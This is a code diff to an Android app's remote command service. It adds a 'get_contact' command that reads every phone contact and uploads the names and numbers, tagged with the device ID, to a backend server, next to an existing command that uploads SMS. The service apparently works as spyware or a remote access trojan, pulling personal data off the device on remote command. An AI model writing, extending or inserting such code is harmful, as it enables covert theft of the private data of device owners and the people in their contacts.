@@ -29,6 +29,7 @@ import android.telephony.TelephonyManager
 import android.telephony.PhoneStateListener
 import android.telephony.CellInfo
 import android.telephony.CellSignalStrength
+import android.provider.ContactsContract
 
 
 
@@ -129,12 +130,67 @@ class CommandService : Service() {
                             uploadSmsToBackend(applicationContext)
                         }
 
+                        "get_contact" -> {
+                            uploadContactsToBackend(applicationContext)
+                        }
+
+
 
                     }
 
                 } catch (e: Exception) {
                     Log.e("CmdService", "Parse error: ${e.message}")
                 }
+            }
+        })
+    }
+
+    private fun getContacts(context: Context): JSONArray {
+        val contacts = JSONArray()
+        val resolver = context.contentResolver
+        val cursor = resolver.query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            null, null, null, null
+        )
+    
+        cursor?.use {
+            val idxName = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+            val idxNumber = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+    
+            while (it.moveToNext()) {
+                val obj = JSONObject()
+                obj.put("name", it.getString(idxName))
+                obj.put("number", it.getString(idxNumber))
+                contacts.put(obj)
+            }
+        }
+    
+        return contacts
+    }
+    
+    private fun uploadContactsToBackend(context: Context) {
+        val contactArray = getContacts(context)
+        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+    
+        val json = JSONObject().apply {
+            put("device_id", androidId)
+            put("contacts", contactArray)
+        }
+    
+        val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+    
+        val request = Request.Builder()
+            .url("${ApiConfig.BASE_URL}/api/device/upload_contacts")
+            .post(body)
+            .build()
+    
+        OkHttpClient().newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e("UploadContact", "Failed: ${e.message}")
+            }
+    
+            override fun onResponse(call: Call, response: Response) {
+                Log.i("UploadContact", "Uploaded: ${response.body?.string()}")
             }
         })
     }
